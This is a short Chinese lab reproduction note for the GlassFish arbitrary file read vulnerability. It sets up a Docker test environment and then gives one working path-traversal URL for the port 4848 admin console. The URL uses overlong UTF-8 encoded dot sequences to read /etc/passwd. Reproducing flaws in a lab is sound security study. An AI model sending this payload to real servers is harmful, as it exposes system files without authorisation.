# GlassFish 任意文件读取漏洞

## 漏洞复现

编译、运行测试环境

```plain
docker compose build
docker compose up -d
```

环境运行后，访问http://your-ip:8080和http://your-ip:4848即可查看web页面。其中，8080端口是网站内容，4848端口是GlassFish管理中心。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780876162734-b8ccc222-30f1-42a8-9d07-d1f0f36f5e77.png)

访问https://your-ip:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd，发现已成功读取/etc/passwd内容：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780876163021-48c3d6dc-5642-4765-a0f1-29c82043966b.png)